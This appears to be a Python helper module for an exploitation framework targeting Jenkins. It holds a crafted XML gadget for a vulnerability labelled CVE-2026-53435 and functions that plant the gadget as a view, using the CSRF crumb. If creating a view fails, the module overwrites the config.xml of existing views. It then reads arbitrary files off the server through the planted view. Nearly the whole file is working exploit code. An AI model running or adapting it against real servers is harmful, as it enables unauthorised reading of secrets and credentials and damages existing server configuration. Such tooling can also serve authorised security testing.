#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Jenkins HTTP helpers (auth, crumb, CVE-2026-53435 view gadget)."""

from __future__ import annotations

from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote

from core.framework.base_module import BaseModule
from core.output_handler import print_info, print_status, print_warning

# Planted into ListView <properties> (DescribableList without element-type check pre-patch).
# Stapler routes to hudson.Plugin.doDynamic which serves files from baseResourceURL=file:/.
CVE_2026_53435_GADGET = (
    "<hudson.Plugin_-DummyImpl>"
    '<wrapper class="hudson.PluginWrapper">'
    "<baseResourceURL>file:/</baseResourceURL>"
    "</wrapper>"
    "</hudson.Plugin_-DummyImpl>"
)


class Jenkins(BaseModule):
    """Jenkins HTTP helper mixin for exploit / auxiliary modules."""

    @staticmethod
    def jenkins_normalize_base_path(path_value: Any) -> str:
        value = str(path_value or "/").strip()
        if not value or value == "/":
            return "/"
        if not value.startswith("/"):
            value = "/" + value
        return "/" + value.strip("/")

    @classmethod
    def jenkins_join_path(cls, base_path: Any, *parts: str) -> str:
        root = cls.jenkins_normalize_base_path(base_path)
        clean = [p.strip("/") for p in parts if p and str(p).strip("/")]
        if not clean:
            return root
        if root == "/":
            return "/" + "/".join(clean)
        return root.rstrip("/") + "/" + "/".join(clean)

    def jenkins_set_basic_auth(self, username: str, password: str) -> None:
        user = str(username or "").strip()
        if not user:
            raise ValueError("Jenkins username is required")
        self.set_auth(user, str(password or ""))

    def jenkins_fetch_crumb(self) -> Dict[str, str]:
        """Return CSRF crumb headers, or {} if crumbIssuer is unavailable."""
        path = self.jenkins_join_path(getattr(self, "path", "/"), "crumbIssuer", "api", "json")
        try:
            resp = self.http_request(method="GET", path=path, timeout=15)
        except Exception:
            return {}
        if not resp or not getattr(resp, "ok", False):
            return {}
        try:
            data = resp.json()
        except Exception:
            return {}
        field = str(data.get("crumbRequestField") or "").strip()
        crumb = str(data.get("crumb") or "").strip()
        if field and crumb:
            return {field: crumb}
        return {}

    def jenkins_whoami(self) -> Tuple[Optional[str], int]:
        path = self.jenkins_join_path(getattr(self, "path", "/"), "whoAmI", "api", "json")
        try:
            resp = self.http_request(method="GET", path=path, timeout=15)
        except Exception:
            return None, 0
        code = int(getattr(resp, "status_code", 0) or 0) if resp else 0
        if not resp or not getattr(resp, "ok", False):
            return None, code
        try:
            name = (resp.json() or {}).get("name")
        except Exception:
            return None, code
        return (str(name) if name is not None else None), code

    @staticmethod
    def jenkins_listview_xml(name: str, gadget: str = CVE_2026_53435_GADGET) -> str:
        safe = str(name or "cve53435").strip() or "cve53435"
        return (
            "<?xml version='1.1' encoding='UTF-8'?>"
            f"<hudson.model.ListView><name>{safe}</name>"
            f"<properties>{gadget}</properties>"
            '<jobNames class="tree-set">'
            '<comparator class="hudson.util.CaseInsensitiveComparator"/>'
            "</jobNames>"
            "<jobFilters/><columns/><recurse>false</recurse>"
            "</hudson.model.ListView>"
        )

    def jenkins_list_view_names(self) -> List[str]:
        path = self.jenkins_join_path(
            getattr(self, "path", "/"), "api", "json"
        )
        try:
            resp = self.http_request(
                method="GET",
                path=path,
                params={"tree": "views[name]"},
                timeout=15,
            )
        except Exception:
            return []
        if not resp or not getattr(resp, "ok", False):
            return []
        try:
            views = (resp.json() or {}).get("views") or []
        except Exception:
            return []
        names: List[str] = []
        for view in views:
            if isinstance(view, dict) and view.get("name"):
                names.append(str(view["name"]))
        return names

    def jenkins_plant_view_gadget(
        self,
        view_name: str,
        *,
        headers: Optional[Dict[str, str]] = None,
    ) -> Tuple[bool, str]:
        """Create or overwrite a ListView with the CVE-2026-53435 gadget.

        Returns (ok, view_name_used).
        """
        name = str(view_name or "cve53435").strip() or "cve53435"
        xml = self.jenkins_listview_xml(name)
        hdrs = {"Content-Type": "application/xml"}
        if headers:
            hdrs.update(headers)

        create_path = self.jenkins_join_path(getattr(self, "path", "/"), "createView")
        try:
            resp = self.http_request(
                method="POST",
                path=create_path,
                params={"name": name},
                data=xml.encode("utf-8"),
                headers=hdrs,
                allow_redirects=False,
                timeout=20,
            )
        except Exception as exc:
            print_warning(f"createView request failed: {exc}")
            resp = None

        code = int(getattr(resp, "status_code", 0) or 0) if resp else 0
        print_status(f"createView '{name}' -> HTTP {code}")
        if code in (200, 302):
            return True, name

        print_info("createView failed; trying overwrite of existing views via config.xml")
        for vn in self.jenkins_list_view_names():
            cfg = self.jenkins_join_path(
                getattr(self, "path", "/"), "view", quote(vn, safe=""), "config.xml"
            )
            body = self.jenkins_listview_xml(vn)
            try:
                rr = self.http_request(
                    method="POST",
                    path=cfg,
                    data=body.encode("utf-8"),
                    headers=hdrs,
                    allow_redirects=False,
                    timeout=20,
                )
            except Exception:
                continue
            rr_code = int(getattr(rr, "status_code", 0) or 0) if rr else 0
            print_status(f"overwrite view '{vn}' config.xml -> HTTP {rr_code}")
            if rr_code in (200, 302):
                return True, vn

        return False, name

    def jenkins_read_via_view_gadget(
        self,
        view_name: str,
        remote_file: str,
    ) -> Tuple[str, int]:
        """GET /view/<name>/properties/0/<path> after gadget plant."""
        name = str(view_name or "").strip()
        remote = str(remote_file or "").strip()
        if not name or not remote:
            return "", 0
        rel = remote.lstrip("/")
        # Keep path segments; Stapler expects restOfPath under file:/
        path = self.jenkins_join_path(
            getattr(self, "path", "/"),
            "view",
            quote(name, safe=""),
            "properties",
            "0",
            *rel.split("/"),
        )
        try:
            resp = self.http_request(method="GET", path=path, timeout=20)
        except Exception:
            return "", 0
        code = int(getattr(resp, "status_code", 0) or 0) if resp else 0
        body = (resp.text or "") if resp else ""
        return body, code
